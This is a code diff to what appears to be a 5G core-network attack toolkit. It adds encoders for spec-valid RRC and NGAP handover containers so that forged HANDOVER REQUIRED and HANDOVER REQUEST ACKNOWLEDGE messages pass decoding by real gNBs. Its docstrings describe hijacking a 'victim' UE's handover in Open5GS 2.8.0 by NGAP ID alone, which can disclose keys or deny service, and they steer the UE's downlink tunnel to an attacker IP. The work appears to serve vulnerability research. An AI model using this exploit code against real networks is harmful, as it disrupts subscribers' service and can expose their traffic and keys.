@@ -437,18 +437,173 @@ def _global_gnb_id(cfg: dict, gnb_id: int, gnb_id_len: int = 32):
     })
 
 
+def _rrc_reconfiguration() -> bytes:
+    """Minimal TS 38.331 RRCReconfiguration (UPER): transaction id 0, empty IEs.
+
+    Spec-valid so a real gNB can decode the container. No
+    reconfigurationWithSync / radioBearerConfig — not a usable radio HO.
+    """
+    from .ngap import encode_rrc_uper
+    return encode_rrc_uper(
+        "NR_RRC_Definitions", "RRCReconfiguration",
+        {"rrc-TransactionIdentifier": 0,
+         "criticalExtensions": ("rrcReconfiguration", {})},
+    )
+
+
+def _ue_nr_capability() -> bytes:
+    """Minimal TS 38.331 UE-NR-Capability (UPER).
+
+    rel15, ROHC profiles all false, one FR1 band (n78). Looks like a real
+    capability IE so OAI can re-UPER-encode ue-CapabilityRAT-List (empty list
+    can make that encode return len<=0 and abort Handover Request). Not a
+    capability-spoof payload.
+    """
+    from .ngap import encode_rrc_uper
+    return encode_rrc_uper(
+        "NR_RRC_Definitions", "UE_NR_Capability",
+        {
+            "accessStratumRelease": "rel15",
+            "pdcp-Parameters": {
+                "supportedROHC-Profiles": {
+                    "profile0x0000": False,
+                    "profile0x0001": False,
+                    "profile0x0002": False,
+                    "profile0x0003": False,
+                    "profile0x0004": False,
+                    "profile0x0006": False,
+                    "profile0x0101": False,
+                    "profile0x0102": False,
+                    "profile0x0103": False,
+                    "profile0x0104": False,
+                },
+                "maxNumberROHC-ContextSessions": "cs2",
+            },
+            "phy-Parameters": {},
+            "rf-Parameters": {
+                "supportedBandListNR": [{"bandNR": 78}],
+            },
+        },
+    )
+
+
+def _handover_preparation_information() -> bytes:
+    """Minimal valid TS 38.331 HandoverPreparationInformation (UPER).
+
+    One nr RAT container + sourceConfig wrapping an empty RRCReconfiguration
+    (Cond HO). OAI gNB uper-decodes rRCContainer and AssertFatal's if that
+    fails — a single 0x00 octet is not a valid PDU.
+    """
+    from .ngap import encode_rrc_uper
+    return encode_rrc_uper(
+        "NR_InterNodeDefinitions", "HandoverPreparationInformation",
+        {"criticalExtensions": ("c1", (
+            "handoverPreparationInformation",
+            {
+                "ue-CapabilityRAT-List": [{
+                    "rat-Type": "nr",
+                    "ue-CapabilityRAT-Container": _ue_nr_capability(),
+                }],
+                "sourceConfig": {
+                    "rrcReconfiguration": _rrc_reconfiguration(),
+                },
+            },
+        ))},
+    )
+
+
+def _handover_command_rrc() -> bytes:
+    """Minimal valid TS 38.331 HandoverCommand (UPER).
+
+    Inner handoverCommandMessage is a legal RRCReconfiguration with empty IEs.
+    Enough for the source gNB to ASN.1-decode the TargetToSource container;
+    it is not a usable radio reconfiguration.
+    """
+    from .ngap import encode_rrc_uper
+    return encode_rrc_uper(
+        "NR_InterNodeDefinitions", "HandoverCommand",
+        {"criticalExtensions": ("c1", (
+            "handoverCommand",
+            {"handoverCommandMessage": _rrc_reconfiguration()},
+        ))},
+    )
+
+
+def source_to_target_container(cfg: dict, *, pdu_sessions=(1,),
+                               target_nci: int | None = None, qfis=(1,)) -> bytes:
+    """APER SourceNGRANNode-ToTargetNGRANNode-TransparentContainer (TS 38.413).
+
+    Mandatory: rRCContainer (HandoverPreparationInformation), targetCell-ID
+    (NR-CGI), uEHistoryInformation (one last-visited NR cell = this tester's
+    CGI, cellSize=small, timeUEStayedInCell=10). Optional PDU-session list
+    names the same PSI/QFI as the outer Handover Required — identity only,
+    no dLForwarding. `target_nci` is the NR Cell Identity in targetCell-ID
+    (defaults to cfg['nci']); set it to the real target gNB's NCI when that
+    gNB (OAI) looks up the cell.
+    """
+    from .ngap import encode_transfer
+    target_cgi = _nr_cgi(cfg, target_nci)
+    source_cgi = _nr_cgi(cfg)  # last-visited = this tester's cell
+    pdu_list = [
+        {"pDUSessionID": int(pid),
+         "qosFlowInformationList": [
+             {"qosFlowIdentifier": int(q)} for q in qfis]}
+        for pid in pdu_sessions
+    ]
+    return encode_transfer(
+        "SourceNGRANNode_ToTargetNGRANNode_TransparentContainer",
+        {
+            "rRCContainer": _handover_preparation_information(),
+            "pDUSessionResourceInformationList": pdu_list,
+            "targetCell-ID": target_cgi,
+            "uEHistoryInformation": [{
+                "lastVisitedCellInformation": ("nGRANCell", {
+                    "globalCellID": source_cgi,
+                    "cellType": {"cellSize": "small"},
+                    "timeUEStayedInCell": 10,
+                }),
+            }],
+        },
+    )
+
+
+def target_to_source_container() -> bytes:
+    """APER TargetNGRANNode-ToSourceNGRANNode-TransparentContainer.
+
+    Only mandatory IE is rRCContainer = HandoverCommand. Used as the default
+    TargetToSource IE of Handover Request Acknowledge so a real source gNB
+    (OAI) can aper-decode the container instead of seeing a dummy 0x00.
+    """
+    from .ngap import encode_transfer
+    return encode_transfer(
+        "TargetNGRANNode_ToSourceNGRANNode_TransparentContainer",
+        {"rRCContainer": _handover_command_rrc()},
+    )
+
+
 def handover_required(amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
                       target_gnb_id: int, pdu_sessions=(1,),
                       target_gnb_id_len: int | None = None,
                       cause=("radioNetwork", "handover-desirable-for-radio-reason"),
-                      src2tgt_container: bytes = b"\x00"):
+                      src2tgt_container: bytes | None = None,
+                      target_nci: int | None = None):
     """HANDOVER REQUIRED (Class 1). Open5GS 2.8.0: CONFIRMED cross-gNB.
 
     Locates the victim by `AMF-UE-NGAP-ID` alone (ngap-handler.c:3519, no gNB
     binding) and forces relocation toward `target_gnb_id`. Disclosure (NH/NCC/N3)
     only if the attacker also controls the *named target* gNB; otherwise it is a
     mobility/DoS primitive against a UE served by another gNB.
+
+    Default SourceToTarget-TransparentContainer is a spec-valid
+    SourceNGRANNode-ToTargetNGRANNode encoding (see source_to_target_container).
+    Pass `src2tgt_container=` only to override (e.g. malformed-container cases).
+    `target_nci` is the NR Cell Identity in targetCell-ID (defaults to
+    cfg['nci']); set it to the real target gNB's NCI when that gNB (OAI)
+    looks up the cell after decoding the container.
     """
+    if src2tgt_container is None:
+        src2tgt_container = source_to_target_container(
+            cfg, pdu_sessions=pdu_sessions, target_nci=target_nci)
     tac = int(cfg["tac"]).to_bytes(3, "big")
     tgt_len = int(target_gnb_id_len if target_gnb_id_len is not None else 32)
     target = ("targetRANNodeID", {
@@ -480,7 +635,7 @@ def handover_request_acknowledge(amf_ue_id: int, ran_ue_id: int, *,
                                  pdu_sessions=(1,),
                                  attacker_ip: str = "127.0.0.1",
                                  teid=1, qfis=(1,),
-                                 tgt2src_container: bytes = b"\x00"):
+                                 tgt2src_container: bytes | None = None):
     """HANDOVER REQUEST ACKNOWLEDGE (Class 1, procedureCode 13).
 
     Target-side reply that completes N2 handover *preparation*. Used by the
@@ -488,8 +643,12 @@ def handover_request_acknowledge(amf_ue_id: int, ran_ue_id: int, *,
     TargetID, the AMF sends HandoverRequest here; acknowledging it (and later
     injecting p21/p09) exercises the mid-handover gate that idle p09/p21 hit.
     Mandatory IEs: AMF/RAN-UE-NGAP-ID, PDUSessionResourceAdmittedList (53),
-    TargetToSource-TransparentContainer (106)."""
+    TargetToSource-TransparentContainer (106). Default TargetToSource is a
+    spec-valid TargetNGRANNode-ToSourceNGRANNode encoding (HandoverCommand);
+    pass `tgt2src_container=` only to override."""
     from .ngap import encode_transfer
+    if tgt2src_container is None:
+        tgt2src_container = target_to_source_container()
     transfer = encode_transfer("HandoverRequestAcknowledgeTransfer", {
         "dL-NGU-UP-TNLInformation": _gtp_tunnel(attacker_ip, teid),
         "qosFlowSetupResponseList": [
